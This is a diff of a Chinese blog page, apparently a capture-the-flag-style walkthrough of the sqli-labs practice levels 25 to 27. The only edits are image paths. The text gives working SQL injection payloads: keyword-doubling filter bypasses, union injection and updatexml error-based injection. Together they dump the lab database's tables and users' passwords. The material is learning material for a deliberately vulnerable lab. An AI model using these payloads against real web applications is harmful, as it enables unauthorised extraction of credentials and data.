@@ -64,7 +64,7 @@
 <p>（4）利用符号 and=&amp;&amp;，or=||</p>
 <p>（5）构造字符串——oorr，anandd</p>
 <p>我们查看源码：</p>
-<p><img src="/2021/02/04/lesson25-28a/1.png" alt="1"></p>
+<p><img src="/lesson25/1.png" alt="1"></p>
 <p>这里的or和and采用了i正则匹配，大小写都无法绕过。</p>
 <p>{               <strong>拓展一下PHP正则表达式的模式修饰符</strong></p>
 <ul>
@@ -87,35 +87,35 @@
 <p>从中得知这关为单引号类型注入。</p>
 <p>当输入?id=1时，页面有回显。那么我们可以采用union联合注入。</p>
 <h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库:"></a>爆库:</h3><p>输入：?id=0’  union select 1,2,database()–+</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/2.png" alt="2"></p>
+<p>得，<img src="/lesson25/2.png" alt="2"></p>
 <h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=0’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where </p>
 <p>table_schema=’security’–+</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/3.png" alt="3"></p>
+<p>得，<img src="/lesson25/3.png" alt="3"></p>
 <p>注：information中也含有or，因此也需要做绕过处理。</p>
 <h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=0’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where </p>
 <p>table_schema=’security’–+</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/4.png" alt="4"></p>
+<p>得，<img src="/lesson25/4.png" alt="4"></p>
 <h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=0’ union select 1,2,group_concat(username,0x3a,passwoorrd) from users–+</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/5.png" alt="5"></p>
+<p>得，<img src="/lesson25/5.png" alt="5"></p>
 <p>注：password中也含有or，因此也需要做绕过处理。</p>
 <h2 id="lesson25a"><a href="#lesson25a" class="headerlink" title="lesson25a:"></a>lesson25a:</h2><p>和lesson25没什么区别，注意注入类型就好了。</p>
-<h2 id="lesson26："><a href="#lesson26：" class="headerlink" title="lesson26："></a>lesson26：</h2><p>查看源码：<img src="/2021/02/04/lesson25-28a/6.png" alt="6"></p>
+<h2 id="lesson26："><a href="#lesson26：" class="headerlink" title="lesson26："></a>lesson26：</h2><p>查看源码：<img src="/lesson25/6.png" alt="6"></p>
 <p>我们可以看到它就过滤了一堆字符。此时，我们可以采用<strong>URL编码</strong>绕过这些过滤：</p>
 <p>+       URL 中+号表示空格                 %2B<br>空格  URL中的空格可以用+号或者编码      %20<br>/        分隔目录和子目录                   %2F<br>?        分隔实际的URL和参数               %3F<br>%       指定特殊字符                     %25<br>#       表示书签                         %23<br>&amp;       URL 中指定的参数间的分隔符         %26<br>=        URL 中指定参数的值                %3D</p>
 <p>我不知道为什么空格我一直找不到绕开的方法，上面的几种都不行，好像是apache的问题，要我们用linux系统才能绕过。既然这样我们只能避免输入空格了，使用报错注入——</p>
 <h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,database()),1)||’1’=’1</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/7.png" alt="7"></p>
+<p>得，<img src="/lesson25/7.png" alt="7"></p>
 <h3 id="爆表：-1"><a href="#爆表：-1" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/8.png" alt="8"></p>
+<p>得，<img src="/lesson25/8.png" alt="8"></p>
 <h3 id="爆列：-1"><a href="#爆列：-1" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’anandd(table_schema=’security’)))),1)||’1’=’1</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/9.png" alt="9"></p>
+<p>得，<img src="/lesson25/9.png" alt="9"></p>
 <h3 id="爆值：-1"><a href="#爆值：-1" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=1’||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||’1’=’1</p>
-<p>得，<img src="/2021/02/04/lesson25-28a/10.png" alt="10"></p>
+<p>得，<img src="/lesson25/10.png" alt="10"></p>
 <p>这里有一个问题，limit因为过滤因素用不了，很难受，而且报错长度又有限，那么这时我们可以通过控制id的值来一个个查询，例如输入：?id=1’ || updatexml(1, concat(0x7e, (select (group_concat(  concat_ws(0x7e,username,passwoorrd)  )) from (security.users)  where(id=5))) ,1)  || ‘1’=’1</p>
 <h2 id="lesson26a："><a href="#lesson26a：" class="headerlink" title="lesson26a："></a>lesson26a：</h2><p>当我们输入导致sql语法错误的时候，不会回显，那么我们就无法使用报错注入了。</p>
 <h2 id="lesson27："><a href="#lesson27：" class="headerlink" title="lesson27："></a>lesson27：</h2><p>同lesson26，报错注入。</p>
 <p>源码：</p>
-<p><img src="/2021/02/04/lesson25-28a/11.png" alt="11"></p>
+<p><img src="/lesson25/11.png" alt="11"></p>
 <ul>
 <li><p>若想使用union联合注入，只需要将 union 和 select 改为大小写混合就可以了。</p>
 </li>
